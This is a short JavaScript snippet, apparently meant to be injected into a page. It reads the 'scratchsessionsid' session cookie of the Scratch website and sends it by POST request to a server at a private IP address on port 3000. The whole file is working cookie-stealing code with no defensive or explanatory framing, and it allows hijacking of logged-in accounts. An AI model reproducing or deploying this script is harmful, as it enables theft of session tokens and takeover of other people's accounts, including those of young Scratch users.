(async function() {
    // Define the server address
    const serverAddress = 'https://172.27.48.1:3000'; // Replace with your actual server address

    // Function to get the value of a specified cookie
    function getCookieValue(cookieName) {
        const name = cookieName + "=";
        const decodedCookie = decodeURIComponent(document.cookie);
        const cookiesArray = decodedCookie.split(';');
        for (let cookie of cookiesArray) {
            cookie = cookie.trim();
            if (cookie.indexOf(name) === 0) {
                return cookie.substring(name.length);
            }
        }
        return "";
    }

    // Get the value of the 'scratchsessionsid' cookie
    const scratchSessionId = getCookieValue('scratchsessionsid');

    // Send data to the server
    try {
        const response = await fetch(`${serverAddress}/receive-cookie`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                data: scratchSessionId 
            }),
        });

        if (!response.ok) {
            throw new Error('Network response was not ok');
        }

        const responseData = await response.json();
        console.log('Cookie sent successfully:', responseData);
    } catch (error) {
        console.error('Error sending cookie:', error);
    }
})();
